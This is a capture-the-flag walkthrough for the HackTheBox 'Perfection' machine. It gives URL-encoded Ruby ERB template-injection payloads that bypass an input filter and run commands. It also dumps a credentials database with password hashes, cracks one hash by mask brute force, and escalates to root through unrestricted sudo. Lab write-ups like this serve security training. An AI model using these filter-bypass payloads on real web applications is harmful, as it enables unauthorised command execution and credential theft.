# Perfection Walkthrough
<br/>

## Intro
Welcome to the Perfection challenge Walkthrough from HackTheBox, here is the link to the [room](https://app.hackthebox.com/machines/Perfection)
In this room we are gonna practice with web applications and injection to gain access to the machine an red the user and root's flags.

To interact with the machine connect via OpenVPN using the "lab" config profile.

Whenever you feel ready press "Join the Machine"

<br/>
<br/>

## The Challenge
Let's begin with a port scan using *nmap*:
```bash
nmap -sV MACHINE_IP
```
Here is the scan report:
```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx
```

I have decided as usual to do a directory scan but nothing useful appeared.
Navigating the website there is one page where we can insert values and calculate our weighted grade, whenever there is a webform that accepts user input is always good to test if we can inject some code.

Looking around we can also notice that at the bottom of the pages there is written Webrick 1.7.0, which is a ruby library used for webservers.

My first try was with the simple Javascript alert  box and after submitting it, i got the message "Malicious input blocked", this means that there is some kind of filtering active and we need to bypass it.

So i decided to jump into Burpsuite and use it's proxy to capture the HTTP request of the webform, here i discovered that the payload need to be URL encoded, more specifically the key-characters.

After a bit of testing this URL encoded payload worked, showing the result of the multiplication ($2*2$), this means that those parameters are effectively being executed by the server.
```
hello%0A'<%25%3D+2*2+%25>'&grade1=0&weight1=100&category2=a&grade2=0&weight2=0&category3=b&grade3=0&weight3=0&category4=c&grade4=0&weight4=0&category5=d&grade5=0&weight5=0
```

Now we have to try to substitute that multiplication with something like `whoami` to test if we can actually execute commands:
```
hello%0A'<%25%3D+`whoami`+%25>'&grade1=0&weight1=100&category2=a&grade2=0&weight2=0&category3=b&grade3=0&weight3=0&category4=c&grade4=0&weight4=0&category5=d&grade5=0&weight5=0
```
Successfully seeing that we are "susan"
**Note** the backticks wrapping the command, as with normal or double ticks it won't work.

Now we can use this method to read the user flag:
```
category1=hello%0A'<%25%3D+`cat+/home/susan/user.txt`+%25>'
&grade1=0&weight1=100&category2=a&grade2=0&weight2=0&category3=b&grade3=0&weight3=0&category4=c&grade4=0&weight4=0&category5=d&grade5=0&weight5=0
```
--> REDACTED
<br/>

Looking around in susan's home directory i have noticed that there is a folder owned and created by root called Migration, following this path i ended up to a file: `/home/susan/Migration/pupilpath_credentials.db` 
Let's view it:
```
category1=hello%0A'<%25%3D+`cat+/home/susan/Migration/pupilpath_credentials.db`+%25>'
&grade1=0&weight1=100&category2=a&grade2=0&weight2=0&category3=b&grade3=0&weight3=0&category4=c&grade4=0&weight4=0&category5=d&grade5=0&weight5=0
```

This is the content of the file:
```
SQLite format tableusersusersCREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
)
Stephen Locke 154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrencef f7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tyler d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithd d560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Miller abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
```

Let's find out the hash type using the tool *name-that-hash*:
```bash
nth --text "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f"
```

The type is SHA-256 which translates to mode 1400 if you are using *Hashcat*.
Save the hash into a file:
```bash
echo "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f" > hash.txt
```

I have tried to run *Hashcat* on it but it was not able to give me the password, so hi have decided to look around for some more clues.

In /var/mail there is a message for Susan
```bash
cat /var/mail/susan
```

```
'Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
Note that all letters of the first name should be convered into lowercase.
Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

In our scenario this translate to the password being susan_nasus_THE-RANDOM-NUMBER, then all is hashed

Now we can use again Hashcat:
```bash
hashcat -a 3 -m 1400 hash.txt "susan_nasus_?d?d?d?d?d?d?d?d?d" --show
```
the `?d` are used to tell the tool that those are the entries to brute force using numbers(0-9), while `-a 3` is setting to use the brute-force mask attack mode.
And you should get: susan_nasus_413759210

Since with *nmap* we found port 22 open and now we have Susan's credentials we can ssh as her:
```
ssh susan@IP
```

<br/>

### Privilege Escalation
Now we need to escalate our privileges to root to read the last flag.

let's check what we can run as sudo
```bash
sudo -l
```
```
User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

Well looks like we do not really need to do some magic escalation, we can just change user and read the flag
```bash
sudo su root
```

Now we are root!

Get the flag:
```bash
cat /root/root.txt
```

<br/>

Congratulations, you have completed this Perfection challenge, i had a lot of fun doing it hope you did as well. <br>
If you wanna see more write ups you can check the WriteUps Directory in this GitHub repo. <br>

Catch you in the next CTF 😃 <br>
